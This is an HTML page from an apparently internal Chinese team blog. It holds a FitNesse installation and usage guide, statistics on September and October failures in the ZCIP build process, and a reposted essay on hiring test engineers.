+					<a href="http://10.45.19.178/wordpress/?p=258#respond" title="《Fitnesse安装、部署和使用》上的评论"><span class="leave-reply">发表回复</span></a>				</div><!-- .comments-link -->
+					</header><!-- .entry-header -->
+
+				<div class="entry-content">
+			<p>&nbsp;</p>
+<h1>1??? Fitnesse 的安装</h1>
+<p>Fitnesse的下载，fitnesse应用存放在svn的http://10.45.7.141:9050/svn/Development_TC/ZTF/06 Fitnesse目录内，文件名：fitnesse-standalone.jar，后续的fitnesse定制化开发在此集成上进行。</p>
+<p>Fitnesse的安装和部署，在主机上安装jdk并设置java环境变量，下载fitnesse-standalone.jar， 使用命令：java -jar /home/zcip/zcip/fitnesse/fitnesse-standalone.jar -p 8009 -d /home/zcip/zcip/fitnesse，-p 端口，-d 工作目录，端口和工作目录在生产环境中应避免修改，其他命令如下：</p>
+<p>Usage: java -jar fitnesse.jar [-pdrleoab]</p>
+<p>-p &lt;port number&gt; {80}</p>
+<p>-d &lt;working directory&gt; {.}</p>
+<p>-r &lt;page root directory&gt; {FitNesseRoot}</p>
+<p>-l &lt;log directory&gt; {no logging}</p>
+<p>-e &lt;days&gt; {14} Number of days before page versions expire</p>
+<p>-o omit updates</p>
+<p>-a {user:pwd | user-file-name} enable authentication.</p>
+<p>-i Install only, then quit.</p>
+<p>-c &lt;command&gt; execute single command.</p>
+<p>-b &lt;filename&gt; redirect command output.</p>
+<p>启动后直接访问：<a href="http://X.X.X.X:8009/">http://X.X.X.X:8009/</a> 即可</p>
+<h1>2?? Fitnesse的使用</h1>
+<p>1、????????????????? Fitnesse的用例名称必须符合<em>WikiWord</em><em>规范（两个或两个以上的单词首字母需大写且每个单词不得少于两个字母）：</em><a href="http://twiki.org/cgi-bin/view/TWiki/WikiWord">http://twiki.org/cgi-bin/view/TWiki/WikiWord</a></p>
+<p>2、????????????????? Fitnesse针对不同的页面有不同的功能，test page 是真正的测试编写界面，suite page的是story的集合，static page是静态页面，如set up page 和 tear down page 这种用来做前期初始后后期清理的页面</p>
+<p align="left">3、????????????????? 在初始界面里面，可以看到右上方有3个按钮。点击edit按钮，在该页面可以新增页面如MyNewPage，保存返回当前页面。点击MyNewPage，可以在该页面进行操作，选择添加，点击add按钮，选择test page ，进入新页面的编辑页面，命名规则符合<em>WikiWord</em>，如ZcipTest。进而编写相关的story。</p>
+<p>4、????????????????? 具体的实例和操作见<a href="http://fitnesse.org/FitNesse.UserGuide">http://fitnesse.org/FitNesse.UserGuide</a></p>
+					</div><!-- .entry-content -->
+		
+		<footer class="entry-meta">
+			本条目发布于 <a href="http://10.45.19.178/wordpress/?p=258" title="13:32" rel="bookmark"><time class="entry-date" datetime="2013-12-09T13:32:50+00:00">2013/12/09</time></a>。属于 <a href="http://10.45.19.178/wordpress/?cat=1" title="查看 未分类 中的全部文章" rel="category">未分类</a> 分类，被贴了 <a href="http://10.45.19.178/wordpress/?tag=fitnesse" rel="tag">fitnesse</a>、<a href="http://10.45.19.178/wordpress/?tag=%e5%88%86%e5%b1%82%e6%b5%8b%e8%af%95" rel="tag">分层测试</a> 标签。<span class="by-author">作者是 <span class="author vcard"><a class="url fn n" href="http://10.45.19.178/wordpress/?author=16" title="查看所有由 cheng.haiming 发布的文章" rel="author">cheng.haiming</a></span>。</span>								</footer><!-- .entry-meta -->
+	</article><!-- #post -->
+			<a href="http://10.45.19.178/wordpress/?author=13" title="由 chen.hua6 发布" rel="author">chen.hua6</a>				
+	<article id="post-247" class="post-247 post type-post status-publish format-image hentry category-uncategorized">
+		<div class="entry-content">
+			<p style="text-align: center;padding-left: 30px"><strong>9月,10月流程问题分析统计：</strong></p>
+<p style="padding-left: 30px">统计的目的主要是解决重复率高的错误，找出改进方法，防止同样的问题反复</p>
+<p style="padding-left: 30px">维度一：我们分析的流程记录</p>
+<p style="padding-left: 30px">10月流程分析：</p>
+<table width="216" border="0" cellspacing="0" cellpadding="0">
+<col width="130" />
+<col width="86" />
+<tbody>
+<tr>
+<td width="130" height="19">ERROR_DESC</td>
+<td width="86">CNT</td>
+</tr>
+<tr>
+<td height="19">未分析</td>
+<td align="right">163</td>
+</tr>
+<tr>
+<td height="98">其他(归类于1 代理进程连接不上&#8212;&#8212;查找连接不上的原因<br />
+2 主机重启zcip客户端没起来<br />
+3 web部署失败，主机空间满了<br />
+4 后台编译失败)</td>
+<td align="right">73</td>
+</tr>
+<tr>
+<td height="134">主机或网络故障(1 主机空间满了<br />
+2 主机内存没了<br />
+3 主机断电<br />
+4 agent代理端进程未启动5 上传文件失败)</td>
+<td align="right">32</td>
+</tr>
+<tr>
+<td height="19">业务版本质量</td>
+<td align="right">11</td>
+</tr>
+<tr>
+<td height="19">ZCIP程序故障</td>
+<td align="right">4</td>
+</tr>
+<tr>
+<td height="19">配置问题</td>
+<td align="right">4</td>
+</tr>
+<tr>
+<td height="19">SVN服务端异常</td>
+<td align="right">3</td>
+</tr>
+<tr>
+<td height="19">数据库异常</td>
+<td align="right">2</td>
+</tr>
+<tr>
+<td height="19">第三方工具问题</td>
+<td align="right">2</td>
+</tr>
+<tr>
+<td height="19">数据源问题</td>
+<td align="right">1</td>
+</tr>
+</tbody>
+</table>
+<p style="padding-left: 30px">10月流程分析：</p>
+<table width="214" border="0" cellspacing="0" cellpadding="0">
+<col width="150" />
+<col width="64" />
+<tbody>
+<tr>
+<td width="150" height="19">ERROR_DESC</td>
+<td width="64">CNT</td>
+</tr>
+<tr>
+<td height="19">未分析</td>
+<td align="right">116</td>
+</tr>
+<tr>
+<td height="19">主机或网络故障</td>
+<td align="right">25</td>
+</tr>
+<tr>
+<td height="19">其他</td>
+<td align="right">24</td>
+</tr>
+<tr>
+<td height="19">配置问题</td>
+<td align="right">19</td>
+</tr>
+<tr>
+<td height="19">脚本异常</td>
+<td align="right">6</td>
+</tr>
+<tr>
+<td height="19">SVN服务端异常</td>
+<td align="right">4</td>
+</tr>
+<tr>
+<td height="19">ZCIP程序故障</td>
+<td align="right">3</td>
+</tr>
+<tr>
+<td height="19">业务版本质量</td>
+<td align="right">1</td>
+</tr>
+<tr>
+<td height="19">上游通知不及时</td>
+<td align="right">1</td>
+</tr>
+</tbody>
+</table>
+<p style="padding-left: 30px">两个月的统计重点基本一致，统计最多的问题是：代理连接失败，?主机断电重启，FTP上传失败</p>
+<p style="padding-left: 30px">问题集合1 ： 问题归类最多分类：其他&#8212;&#8212;-基本全部都能分配到下面定性的分类中，例如：</p>
+<p style="padding-left: 30px"><span style="color: #888888">1 代理进程连接不上<br />
+2 主机重启zcip客户端没起来<br />
+3 web部署失败，主机空间满了<br />
+4 后台编译失败</span></p>
+<p style="padding-left: 30px"><span style="color: #ff0000">大部分都是很明确可以归类到分类中，请后续各个流程前后台分析人员务必确保填入正确的归类中,确保统计的正确性</span></p>
+<p style="padding-left: 30px">问题集合2：主机或网络故障(1&#8211;3点)，<span style="color: #ff0000">请贾宛玉关注，先将windows的环境统一换成unix，减少上传文件失败等问题。对unix做监控，尤其是主机down机，内存硬盘告警，在上班时候需要及时通知和解决。</span> 目的是提前发现问题，不需要等第二天的重做版本</p>
+<p style="padding-left: 30px">问题集合3：代理连接失败。<span style="color: #ff0000">请各zcip流程分析人员确认该问题是否是因为1-3问题引起的，如果是，则需要查看该主机是否设置了开机重启agent等定时任务(解决此类问题)。</span>如果不是，则可能是由于agent无故挂起等程序问题。请填入zcip程序故障，并找zcip技术人员查看原因，解决</p>
+<p style="padding-left: 30px">?维度二：所有流程的统计(包含所有的开发流程)?</p>
+<p style="padding-left: 30px">?基本全集中在未分析阶段，这边统计了程序生成的详细描述，发现1千多条记录五花八门，都是包含了实例名称的描述，没有归类分析，不好做统计&#8212;&#8212;&#8212;&#8212;&#8211;<span style="color: #ff0000">请王振颖将未做分析的节点错误类型制定一个默认分类规则，不同的实例名称其类型其实是一样的，都可以归类成不同的几类，</span>例如：</p>
+<table width="538" border="0" cellspacing="0" cellpadding="0">
+<col width="463" />
+<col width="75" />
+<tbody>
+<tr>
+<td width="463" height="19">10.45.15.136 主机的代理端连接失败</td>
+<td align="right" width="75">20</td>
+</tr>
+<tr>
+<td height="19">10.45.15.137 主机的代理端连接失败</td>
+<td align="right">20</td>
+</tr>
+<tr>
+<td height="19">获取源代码失败</td>
+<td align="right">88</td>
+</tr>
+</tbody>
+</table>
+<table width="538" border="0" cellspacing="0" cellpadding="0">
+<col width="463" />
+<col width="75" />
+<tbody>
+<tr>
+<td width="463" height="19">10.45.19.168 主机的代理端连接失败</td>
+<td align="right" width="75">20</td>
+</tr>
+<tr>
+<td height="19">10.45.18.209 主机的代理端连接失败</td>
+<td align="right">20</td>
+</tr>
+<tr>
+<td height="19">10.45.18.147 主机的代理端连接失败</td>
+<td align="right">20</td>
+</tr>
+</tbody>
+</table>
+		</div><!-- .entry-content -->
+
+		<footer class="entry-meta">
+			<a href="http://10.45.19.178/wordpress/?p=247" title="链向 zcip&#8211;9月，10月流程问题分析及改进 的固定链接" rel="bookmark">
+				<h1>zcip&#8211;9月，10月流程问题分析及改进</h1>
+				<h2><time class="entry-date" datetime="2013-10-24T18:31:38+00:00">2013/10/24</time></h2>
+			</a>
+						<div class="comments-link">
+				<a href="http://10.45.19.178/wordpress/?p=247#respond" title="《zcip&#8211;9月，10月流程问题分析及改进》上的评论"><span class="leave-reply">发表回复</span></a>			</div><!-- .comments-link -->
+								</footer><!-- .entry-meta -->
+	</article><!-- #post -->
+			<a href="http://10.45.19.178/wordpress/?author=16" title="由 cheng.haiming 发布" rel="author">cheng.haiming</a>				
+	<article id="post-245" class="post-245 post type-post status-publish format-standard hentry category-uncategorized">
+				<header class="entry-header">
+									<h1 class="entry-title">
+				<a href="http://10.45.19.178/wordpress/?p=245" title="链向 All about Testing 的固定链接" rel="bookmark">All about Testing</a>
+			</h1>
+										<div class="comments-link">
+					<a href="http://10.45.19.178/wordpress/?p=245#respond" title="《All about Testing》上的评论"><span class="leave-reply">发表回复</span></a>				</div><!-- .comments-link -->
+					</header><!-- .entry-header -->
+
+				<div class="entry-content">
+			<header id="masthead">
+<div>All about Testing</div>
+<hgroup>
+<h1></h1>
+<h2>全部关于测试</h2>
+</hgroup>
+<nav>
+<h1>Menu</h1>
+<div><a title="Skip to content" href="http://sdet.org/?p=245#content">Skip to content</a></div>
+<div>
+<ul id="menu-home">
+<li id="menu-item-104"><a href="http://sdet.org/">首页</a></li>
+<li id="menu-item-109"><a href="http://sdet.org/?page_id=2">关于</a></li>
+</ul>
+</div>
+</nav>
+</header>
+<div id="main">
+<div id="primary">
+<div id="content">
+<nav id="nav-above">
+<h1>Post navigation</h1>
+<div><a href="http://sdet.org/?p=240" rel="prev">←?my github…</a></div>
+</nav>
+<article id="post-245">
+<header>
+<h1>聊一下测试工程师的招聘</h1>
+<div><a title="上午 7:22" href="http://sdet.org/?p=245" rel="bookmark">2013 年 09 月 26 日</a>?by?<a title="View all posts by HuangLi" href="http://sdet.org/?author=4" rel="author">HuangLi</a></div>
+</header>
+<div>
+<p>最近一段时间都在做集中招聘，参加了许多面试，累个半死。加上之前在团队中最近几年也做了不少面试，关于测试工程师招聘的话题，刚才没事特意google了一下，除了一些面试题外居然没有几篇心得方面的文章。上午招聘轮空，抽空写一下自己的看法，仅供参考。记得看完即焚。</p>
+<p>所有团队的招聘，基本上都是要找最“合适”的人，而不是技术最强的人，或者最优秀的人。技术最强的人不一定合适，原因有很多， 1. 岗位一定的情况下，并不需要超出岗位能力特别多的人，完全没有这个需求。</p>
+<p>2. 性价比问题。因为这些人比较“贵”。如果不给比较高的待遇和级别，无法吸引这类候选人。</p>
+<p>3. 如果团队的整体技术水平是6分（满分10分），但候选人是个10分，你觉得他会很乐意跟水平是6的人合作吗？就像把詹姆斯请到cba来打球，即便你付得起薪水，詹姆斯自己也会很郁闷，在他眼中“不怕神一样的对手，就怕猪一样的队友”。</p>
+<p>4. 对管理的挑战比较大，一般来讲，强人一般在融入团队方面有点小问题，除非遇见了比他更强的人。可以参加下文的非技术部分。</p>
+<p>招聘的目的就是要找到最“合适”的人，跟结婚很像，要选择跟自己搭得上的，自己不帅还要那些脸蛋漂亮、身材火爆的，没用，早晚得离，弄不好还给自己带一顶绿帽。 在团队管理中也要充分发挥每个人的长处，扬长避短，让合适的人做适合的事情，才能让团队的贡献最大化（这是另外一个话题，以后有时间再写）。所以在招聘中要试图去发现候选人更多的优点，而不是找他的缺点。你很容易就用一道特别难的题把候选人给问住，或者使劲在他不熟悉的领域让他难堪，除了打击一下候选人的自信之外没啥意义。所以整个面试过程中，多数时间都花费在找优点上。只要不是特别严重的缺点，都可以通过后期的团队管理来弱化其影响。</p>
+<h2>技术方面</h2>
+<p>首先要确定，测试工程师是一个技术岗位。为了彰显这一点，许多公司都把测试岗位的 title 改为测试开发工程师，像微软的sdet（software design/develepment engineer in test）、谷歌叫set（software engineer in test）等。纯粹的手动黑盒测试工程师早已不复存在。所以，技术技能是最基本的要求，我会针对初级岗位、高级岗位或专业岗位的不同要求来讲对招聘的要求。</p>
+<h3>代码能力</h3>
+<p>对于测试开发工程师的招聘，由于其是基础岗位，要求也是最基本的编码能力，所以针对这类岗位，我一般会花费80%的面试时间在技术考核上。之前很多团队遗留下来的恶习，总是觉得测试对技术的要求不高，强调“Test Sense”的重要性，我不是否定它的重要性，但对于应届毕业生或者初级岗位的人，压根儿没做过测试，他有个屁的test sense，还不如去花点时间考核候选人的逻辑思维能力靠点谱。我一般喜欢让候选人现场写写代码，对绝对不是那种巨变态的算法问题，一般都是二分法、字符处理、简单数据结构相关的小题目，只是想看看候选人有没有基本的代码功底。在review代码的时候可以有针对性地对编码语言的一些关键字提问，看看候选人的代码掌控能力。基本上，只要能把自己想法通过代码实现且没有大的逻辑错误，在代码考核这一关都会放过。但如果要得到很高的分数，那必须在代码的可读性、异常处理、算法效率、可测试性方面有比较好的表现。我认为对于测试工程师来说，写代码的能力是必须要有，但不一定要求到达“精通”的地步，特别是在算法效率方面。很多的测试工作，都是在工程系统的验证层面上，你要那么牛逼的算法背景做甚？ 未来转岗去开发吗？有人可能会在这里崩出来说了，编码语言不精通说明潜力不足。潜力是什么？潜力只能说明你现在能力很差而已，有很大的上升空间。幸亏我写这篇文章的时候只是沉溺在自己的思维世界里，否则还不被那些唱反调子的人给恶心死。好了，继续聊我的。具备了基本的代码能力，可以写自动化的程序或者工具即可。在测试程序的算法效率和巧妙性上花费太多的时间，我觉得这是一种不务正业的表现，除了有助于提高你的个人技术之外，对于公司的项目没有任何的价值，对于测试来说，其自动化用例的编写的效率要比执行效率重要的多。在实际的工作中，脚本语言是也是测试代码的最爱，life is short, test in Python，道理大家都懂。</p>
+<h3>测试思路（“Test Sense”）</h3>
+<p>对于一些稍微高端的岗位，例如资深测试开发工程师或者测试专家的招聘，需要考核更多的测试思路和测试技术（参见下一段），不再是简单的程序设计问题。关于测试思路，在写完一段代码之后，会被要求来测试这段代码。这个时候，候选人的测试思路就会涌现出来，尝试尽可能多的测试方法与思路来测试这段代码。一般的候选人会考虑正常情况下的使用场景、边界情况、bad case等功能性的方面问题，这说明你入了门，知道基本的思路，而经验丰富的候选人，会在性能方面多考虑一些，例如performance test, load test, stress test（不知道他们的区别，我只能说你不是性能测试专家，赶紧去google一下吧）。在这里，肯定又有好事者会跳出来说了，哥是来应聘性能测试专家的，你让我写代码我就认了，你还让我针对这些代码做性能测试，我可是正经的性能测试出身，之前都是用的loadrunner、jmeter这些高端大气上档次的性能工具，根本不用自己写代码针对某个函数做性能测试。哎，遇到这种人，也不知道是他的不幸还是我的不幸，但在面试官面前我觉得你还是应该低调一些，如果你公开拒绝，我除了认为你比较坦诚之外还会认为你很有“潜力”，注意这个潜力是上一段中所说的潜力。废话少说，白盒的性能测试或者叫性能分析能力，在跟踪定位性能问题的时候特别重要，如果你还能把gperftool(google perfmance tool)、operfile等工具原理及使用场景告诉我，加分！性能测试绝对不是简单的系统方面的性能测试，能够指出整个系统的性能结果只是第一步，系统级别的性能测试工具loadrunner可以做到，但如果想定位到性能瓶颈所在、并提供改进方案那你就必须要掌握刚刚提到的白盒性能分析能力，从系统层面到模块级别、再到函数级别的问题定位，这才能彰显牛逼人的牛逼之处。就是比普通人多那么一点点。发现我的废话还真多，继续说测试思路的事情，优秀的候选人会提供功能、性能方面的思路，再优秀的人会提供更多的思路，例如稳定性方面，这段代码在持续运行24小时之后怎样？函数的响应时间、内存和cpu的占用情况还跟调用之初一样吗？是否符合预期？还有一些人会考虑安全方面的场景，在多线程的调用下程序会出错吗？是否线程安全？多进程的情况下呢，是否有共享的进程间数据安全问题，有没有被死锁的可能等等。还有很多测试思路方面的点子，在这里就不再一一罗列，你要感兴趣，我们可以私下交流。总之，对于有丰富测试经验的人（可不是工作年头），总是可以提出很多思路和方法，而获得这些知识的唯一来源就是实践，否则几个问题深入下去你就露馅儿，而在面试过程中“诚信”永远是底线，不可违背。</p>
+<h3>测试技术</h3>
+<p>针对高级测试岗位需要一些有针对性的测试技术类问题。例如，针对前端测试岗位，在技术提问上会由针对性地在前端提问，没有自己写过前端程序的人也很难把前端测试做好，html/css/js/Wartir/Selenium/Webdriver等方面的知识必不可少，开源的工具没用过，没有关系，你只要能把类似的思路说清楚也可以。怎样精准定位web页面上得元素、如何得到这个对象而不是另外一个相同类型的元素、背后原理是怎样的，等等这种有针对性的问题很容易试探出候选人在前端测试方面的技术深度。再例如，一个测试工具开发的候选人必须知道框架、工具、平台的区别，框架如何提供接口给业务测试人员使用，哪些是框架要解决的问题哪些是业务测试自己要解决的问题，他们的问题域和解决方案都必须要了如指掌。类似地，在单元测试、api测试、安全测试、mobile测试、后端服务测试、大数据测试等方面，都会有针对性的问题等着你。相比较之前的代码能力，面试官一般更看中测试技术本身的掌握能力，代码能力只能说明你有潜能，而测试技术是未来会在项目中真实用到的技术，会真正地帮助到测试本身的技术。</p>
+<h3>技术热情</h3>
+<p>在之前的面试中，遇到很多候选人，但被问及为什么来选择来做测试时，有些会说“我是女生，我很细心”。卧槽，适合不适合做测试跟细心有个毛线关系，我承认细心体贴是中华女性的传统美德，可测试真不是靠细心就能做的很好的。而且我发现有一批人的确就是这么想的，所以有必要在这里啰嗦几句。可以这样说，细心地观察是可以发现一个事物的某处缺陷，就像“鉴宝”节目中你要细致地观察，你细心你可以发现某个青花瓷藏品中是否砂底有釉，但如果你不了解元青花背后的知识背景即便你发现了这个缺陷你也无法做出正确的判断，相比较细心，更重要的是背后积累的技能知识。知识技能的增长因素中，很重要的就是技术热情。所以即便候选人技能还不到火候，但如果技术热情饱满，我还是会认为这样的人是真正有潜力的人，甚至会给一个通过。俗话说，“活到老，学到老”，背后依赖的就是热情。没有热情的人就像是一潭死水，工作对他而言更多的是一份工作，毫无声色与激情。在技术日新月异当下，没有热情，慢慢地你就“死”了。</p>
+<h2>技术之外</h2>
+<p>每一个岗位都有它的针对性，有及技能要求，也有技术之外的要求。团队中需要什么样的人，我们就招聘什么样的人。除了技术能力之外，你最希望团队中的人具有什么特质？这个恐怕因人而异，但你不得不去思考这些问题。如果你招聘到一个不合适的人，对团队的影响是巨大的，会破换团队的水质。一旦发现这类人，一定要“fire quickly”，否则遗患无穷。这里居然扯出了facebook得招聘理念“hire slowly, fire quickly”，我把它翻译成“结婚慢慢找，离婚快点离”，哎呀，我的思路可真发散啊，都不知道自己要说啥了。:)</p>
+<p>言归正传，在面试过程中，技术之外，考查更多的几个软技能大致如下， 1. 沟通能力。整个面试过程本身就是一次沟通的过程，你能够很好地理解面试官的问题，面试官也能听懂你的答案，perfect，这算是一次完美的沟通了吗，体现了候选人优良的沟通能力。错，大错特错，特别是针对面试这种场景，针对测试这个岗位。候选人听得懂你的问题，有可能是你讲的很明白，而你能听懂他的回答是因为你是这个问题域的专家，可以从少数关键字中抽取出正确的答案，这种语境下，并不能说明候选人就具备良好的表达能力或者优秀的理解力。我个人认为，考核一个人的沟通能力时需要提问一些模糊的问题，在逆境下方显能力。如果候选人可以针对你的问题多问几个问题以及经过后继的一些反复确认，这才能证明他具备一定的沟通能力，并说明候选人是一个爱问问题的人，而对于测试来说，爱问问题或者怀疑的态度永远是最弥足珍贵的品质。 2. 团队合作。测试是整个研发环节中的一环，大型的项目更是需要多人一起测试完成。人与人一起打交道，就会有各种合作的需求。合作关系是一种共赢逐利的行为，强调同步与整体，节调一致。但对于一个产品或者项目，有人做红花就要有人甘愿做绿叶，所以在合作中需要奉献。情商较低的人团队合作一般都比较困难。 3. 执行力。执行力不是简单的听话，“执行”才是听话，“力”更多的是强调执行的结果。没有一个主管喜欢不听话的下属，但听话的下属执行力却不一定强。很多人说的漂亮但做起来却没有说的那么好，相反，有些人动手能力很强，但不苟于言辞。坚强的人，或者笨的人更容易成功，因为他们懂得坚持。 4. 易相处。很多团队强调这一点，一个nice的人，一般都很容易相处，团队成员之间的关系也会比较和谐。一般情商比较高的同学，在这方面都不会有太大的问题。反倒是一些智商高的人，容易让人有点担忧。易相处绝对不是唯一的标准，不易相处的同学会给管理上带来一定的难度，多数管理者都会希望自己的团队成员不是那么的刺头。但在面试的过程中对一个人做出这样的判断还是非常困难的。通用言谈举止，或许可以做出一定的判断，但人一是会伪装的，或者说是掩饰，特别是一些知道自己缺点的人，会尝试掩盖自己的不足。</p>
+<h2>面试技巧</h2>
+<p>所有的技巧基本上都没有什么用处，基本上都是狗屎，再好的技巧都是为了掩饰。所以切记在面试过程中使用什么“技巧”。</p>
+<h2>最后</h2>
+<p>说了这么多，多数都是对候选人的要求，其实对于面试官也一样，你配做面试官吗？你能真实考察出候选人的能力吗？你判断的依据又是什么。千里马难寻的背后往往是因为伯乐太少。写这段话的时候，我也打了几个激灵，!@#$%一身冷汗呀！面试的过程就是选择的过程，不仅对于面试官，对于应聘者也是这样，可以通过面试了解岗位的情况，以便做出适合自己的决定。坦诚，别装，即便你骗过了面试官，在日后的工作中你也骗不了你自己，这对谁都没有好处。公司找合适的人，个人选择适合自己的公司，Double Win。</p>
+<p>最后，关于招聘信息，不少互联网公司都在微博上发布岗位信息，可以重点关注一下。但，别天天没事就挂在微博上，微博上扯淡的人比较多，他们都是优秀的time killer，专门扼杀你宝贵的时间还让你觉得自己长了见识。</p>
+<p>黄 利</p>
+<p>2013.9.26上午</p>
+</div>
+<footer>This entry was posted in?<a title="查看 未分类 中的全部文章" href="http://sdet.org/?cat=1" rel="category">未分类</a>. Bookmark the?<a title="Permalink to 聊一下测试工程师的招聘" href="http://sdet.org/?p=245" rel="bookmark">permalink</a>.</footer>
+</article>
+</div>
+</div>
+</div>
+					</div><!-- .entry-content -->
+		
+		<footer class="entry-meta">
+			本条目发布于 <a href="http://10.45.19.178/wordpress/?p=245" title="10:21" rel="bookmark"><time class="entry-date" datetime="2013-09-27T10:21:41+00:00">2013/09/27</time></a>。属于 <a href="http://10.45.19.178/wordpress/?cat=1" title="查看 未分类 中的全部文章" rel="category">未分类</a> 分类。<span class="by-author">作者是 <span class="author vcard"><a class="url fn n" href="http://10.45.19.178/wordpress/?author=16" title="查看所有由 cheng.haiming 发布的文章" rel="author">cheng.haiming</a></span>。</span>								</footer><!-- .entry-meta -->
+	</article><!-- #post -->
+			
+					<nav id="nav-below" class="navigation" role="navigation">
+			<h3 class="assistive-text">文章导航</h3>
+			<div class="nav-previous alignleft"><a href="http://10.45.19.178/wordpress/?paged=2" ><span class="meta-nav">&larr;</span> 早期文章</a></div>
+			<div class="nav-next alignright"></div>
+		</nav><!-- #nav-below .navigation -->
+	
+		
+		</div><!-- #content -->
+	</div><!-- #primary -->
+
+
+			<div id="secondary" class="widget-area" role="complementary">
+			<aside id="search-2" class="widget widget_search"><form role="search" method="get" id="searchform" action="http://10.45.19.178/wordpress/" >
+	<div><label class="screen-reader-text" for="s">搜索：</label>
+	<input type="text" value="" name="s" id="s" />
+	<input type="submit" id="searchsubmit" value="搜索" />
+	</div>
+	</form></aside><aside id="categories-3" class="widget widget_categories"><h3 class="widget-title">分类目录</h3>		<ul>
+	<li class="cat-item cat-item-12"><a href="http://10.45.19.178/wordpress/?cat=12" title="查看 fitnesse 下的所有文章">fitnesse</a>
+</li>
+	<li class="cat-item cat-item-14"><a href="http://10.45.19.178/wordpress/?cat=14" title="查看 story 下的所有文章">story</a>
+</li>
+	<li class="cat-item cat-item-17"><a href="http://10.45.19.178/wordpress/?cat=17" title="查看 技术回顾 下的所有文章">技术回顾</a>
+</li>
+	<li class="cat-item cat-item-16"><a href="http://10.45.19.178/wordpress/?cat=16" title="查看 技术讨论 下的所有文章">技术讨论</a>
+</li>
+	<li class="cat-item cat-item-1"><a href="http://10.45.19.178/wordpress/?cat=1" title="查看 未分类 下的所有文章">未分类</a>
+</li>
+		</ul>
+</aside><aside id="meta-2" class="widget widget_meta"><h3 class="widget-title">功能</h3>			<ul>
+						<li><a href="http://10.45.19.178/wordpress/wp-login.php">登录</a></li>
+			<li><a href="http://10.45.19.178/wordpress/?feed=rss2" title="使用 RSS 2.0 订阅本站点内容">文章 <abbr title="Really Simple Syndication">RSS</abbr></a></li>
+			<li><a href="http://10.45.19.178/wordpress/?feed=comments-rss2" title="使用 RSS 订阅本站点的所有文章的近期评论">评论 <abbr title="Really Simple Syndication">RSS</abbr></a></li>
+			<li><a href="http://cn.wordpress.org/" title="基于 WordPress，一个优美、先进的个人信息发布平台。">WordPress.org</a></li>
+						</ul>
+</aside>		<aside id="recent-posts-2" class="widget widget_recent_entries">		<h3 class="widget-title">近期文章</h3>		<ul>
+					<li>
+				<a href="http://10.45.19.178/wordpress/?p=316" title="java socket 进阶话题一： socket 客户端连接管理">java socket 进阶话题一： socket 客户端连接管理</a>
+						</li>
+					<li>
+				<a href="http://10.45.19.178/wordpress/?p=312" title="\web安全实战">\web安全实战</a>
+						</li>
+					<li>
+				<a href="http://10.45.19.178/wordpress/?p=307" title="【实例化需求说明】首单回顾 会议纪要">【实例化需求说明】首单回顾 会议纪要</a>
+						</li>
+					<li>
+				<a href="http://10.45.19.178/wordpress/?p=279" title="实例化需求首单回顾">实例化需求首单回顾</a>
+						</li>
+					<li>
+				<a href="http://10.45.19.178/wordpress/?p=276" title="hashcode方法浅析">hashcode方法浅析</a>
+						</li>
+				</ul>
+		</aside><aside id="recent-comments-2" class="widget widget_recent_comments"><h3 class="widget-title">近期评论</h3><ul id="recentcomments"><li class="recentcomments">gu.jibing 发表在《<a href="http://10.45.19.178/wordpress/?p=312#comment-9">\web安全实战</a>》</li><li class="recentcomments">cheng.haiming 发表在《<a href="http://10.45.19.178/wordpress/?p=279#comment-8">实例化需求首单回顾</a>》</li><li class="recentcomments">gu.jibing 发表在《<a href="http://10.45.19.178/wordpress/?p=279#comment-7">实例化需求首单回顾</a>》</li><li class="recentcomments">gu.jibing 发表在《<a href="http://10.45.19.178/wordpress/?p=279#comment-6">实例化需求首单回顾</a>》</li><li class="recentcomments">chen.longting 发表在《<a href="http://10.45.19.178/wordpress/?p=240#comment-5">关于tomcat 的日志管理模式</a>》</li></ul></aside><aside id="archives-2" class="widget widget_archive"><h3 class="widget-title">文章归档</h3>		<ul>
+			<li><a href='http://10.45.19.178/wordpress/?m=201401' title='2014 年一月'>2014 年一月</a></li>
+	<li><a href='http://10.45.19.178/wordpress/?m=201312' title='2013 年十二月'>2013 年十二月</a></li>
+	<li><a href='http://10.45.19.178/wordpress/?m=201310' title='2013 年十月'>2013 年十月</a></li>
+	<li><a href='http://10.45.19.178/wordpress/?m=201309' title='2013 年九月'>2013 年九月</a></li>
+	<li><a href='http://10.45.19.178/wordpress/?m=201307' title='2013 年七月'>2013 年七月</a></li>
+	<li><a href='http://10.45.19.178/wordpress/?m=201306' title='2013 年六月'>2013 年六月</a></li>
+	<li><a href='http://10.45.19.178/wordpress/?m=201305' title='2013 年五月'>2013 年五月</a></li>
+	<li><a href='http://10.45.19.178/wordpress/?m=201304' title='2013 年四月'>2013 年四月</a></li>
+	<li><a href='http://10.45.19.178/wordpress/?m=201303' title='2013 年三月'>2013 年三月</a></li>
+	<li><a href='http://10.45.19.178/wordpress/?m=201302' title='2013 年二月'>2013 年二月</a></li>
+		</ul>
+</aside><aside id="categories-2" class="widget widget_categories"><h3 class="widget-title">分类目录</h3>		<ul>
+	<li class="cat-item cat-item-12"><a href="http://10.45.19.178/wordpress/?cat=12" title="查看 fitnesse 下的所有文章">fitnesse</a>
+</li>
+	<li class="cat-item cat-item-14"><a href="http://10.45.19.178/wordpress/?cat=14" title="查看 story 下的所有文章">story</a>
+</li>
+	<li class="cat-item cat-item-17"><a href="http://10.45.19.178/wordpress/?cat=17" title="查看 技术回顾 下的所有文章">技术回顾</a>
+</li>
+	<li class="cat-item cat-item-16"><a href="http://10.45.19.178/wordpress/?cat=16" title="查看 技术讨论 下的所有文章">技术讨论</a>
+</li>
+	<li class="cat-item cat-item-1"><a href="http://10.45.19.178/wordpress/?cat=1" title="查看 未分类 下的所有文章">未分类</a>
+</li>
+		</ul>
+</aside>		</div><!-- #secondary -->
+		<!--WP Code Highlight_start-->
+	<script type="text/javascript">
+		window.onload = function(){prettyPrint();};
+	</script>
+	<script type="text/javascript" src="http://10.45.19.178/wordpress/wp-content/plugins/wp-code-highlight/js/wp-code-highlight.js"></script>
+	<!--WP Code Highlight_end-->
+	</div><!-- #main .wrapper -->
+	<footer id="colophon" role="contentinfo">
+		<div class="site-info">
+						
+		</div><!-- .site-info -->
+	</footer><!-- #colophon -->
+</div><!-- #page -->
+
+<script type='text/javascript' src='http://10.45.19.178/wordpress/wp-content/themes/twentytwelve/js/navigation.js?ver=1.0'></script>
+</body>
+</html>
